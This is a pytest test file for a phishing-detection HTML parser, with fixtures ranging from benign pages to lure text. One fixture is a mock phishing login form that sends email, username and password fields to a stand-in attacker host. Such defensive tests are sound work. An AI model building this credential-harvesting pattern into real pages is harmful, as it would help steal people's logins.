"""Tests for Priority 4B HTML Semantic + Credential Indicators."""

import pytest
from app.collection.html_parser import html_stats

def test_benign_page():
    """TEST 1 - BENIGN PAGE"""
    html = b'''
    <html>
    <head><title>Example Page</title></head>
    <body>
    <h1>Welcome</h1>
    <p>This is a normal informational page.</p>
    </body>
    </html>
    '''
    stats = html_stats(html, "https://example.com")
    assert stats["form_count"] == 0
    assert stats["password_input_count"] == 0
    assert stats["email_input_count"] == 0
    assert stats["username_input_count"] == 0
    assert stats["credential_input_count"] == 0
    assert stats["external_form_action_count"] == 0
    assert stats["login_keyword_count"] == 0
    assert stats["payment_keyword_count"] == 0
    assert stats["urgency_keyword_count"] == 0
    assert stats["verification_keyword_count"] == 0

def test_login_form():
    """TEST 2 - LOGIN FORM"""
    html = b'''
    <form>
        <input type="email" name="email">
        <input type="password" name="password">
    </form>
    '''
    stats = html_stats(html, "https://example.com")
    assert stats["email_input_count"] == 1
    assert stats["password_input_count"] == 1
    assert stats["credential_input_count"] == 2
    assert stats["form_count"] == 1

def test_username_field():
    """TEST 3 - USERNAME FIELD"""
    html = b'<input type="text" name="username">'
    stats = html_stats(html, "https://example.com")
    assert stats["username_input_count"] == 1
    assert stats["email_input_count"] == 0
    assert stats["password_input_count"] == 0

def test_external_form():
    """TEST 4 - EXTERNAL FORM"""
    html = b'''
    <form action="https://external.example/collect">
        <input type="text" name="data">
    </form>
    '''
    stats = html_stats(html, "https://example.com")
    assert stats["external_form_action_count"] == 1
    assert "external.example" in stats["external_form_domains"]

def test_same_domain_form():
    """TEST 5 - SAME-DOMAIN FORM"""
    html = b'''
    <form action="https://example.com/api/login">
        <input type="text" name="data">
    </form>
    '''
    stats = html_stats(html, "https://example.com")
    assert stats["external_form_action_count"] == 0
    assert "example.com" not in stats["external_form_domains"]

def test_keyword_categories():
    """TEST 6 - KEYWORD CATEGORIES"""
    html = b'''
    <html><body>
    Your account has been suspended.
    Verify your identity immediately.
    Payment information is required.
    </body></html>
    '''
    stats = html_stats(html, "https://example.com")
    assert stats["verification_keyword_count"] > 0
    assert stats["urgency_keyword_count"] > 0
    assert stats["payment_keyword_count"] > 0

def test_mixed_login_page():
    """TEST 7 - MIXED LOGIN PAGE"""
    html = b'''
    <html><body>
    Please log in to verify your identity.
    It is urgent.
    <form action="https://attacker.example/post">
        <input type="email" name="user_email">
        <input type="text" placeholder="username">
        <input type="password" name="pass">
    </form>
    </body></html>
    '''
    stats = html_stats(html, "https://example.com")
    assert stats["login_keyword_count"] > 0
    assert stats["verification_keyword_count"] > 0
    assert stats["urgency_keyword_count"] > 0
    assert stats["email_input_count"] == 1
    assert stats["username_input_count"] == 1
    assert stats["password_input_count"] == 1
    assert stats["credential_input_count"] == 3
    assert stats["external_form_action_count"] == 1
